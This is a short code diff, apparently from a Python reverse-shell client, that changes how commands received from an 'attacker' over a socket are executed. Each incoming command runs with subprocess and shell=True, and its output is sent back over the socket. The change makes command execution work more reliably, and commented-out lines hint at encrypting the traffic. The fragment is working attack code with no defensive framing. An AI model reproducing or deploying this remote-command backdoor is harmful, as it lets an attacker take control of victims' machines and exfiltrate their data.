@@ -31,7 +31,7 @@ try:
                 os.chdir(attacker_input[1])
                 s.send(b'\n')
         elif len(attacker_input) > 0:
-            result = subprocess.run(attacker_input, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, check=False)
+            result = subprocess.run(' '.join(attacker_input), shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, check=False)
             s.send(result.stdout)
             # encrypted_data = asymmetric_encryption.encrypt_message(attacker_input, pub_key)
             # encrypted_data_b64 = encrypted_data.encode()
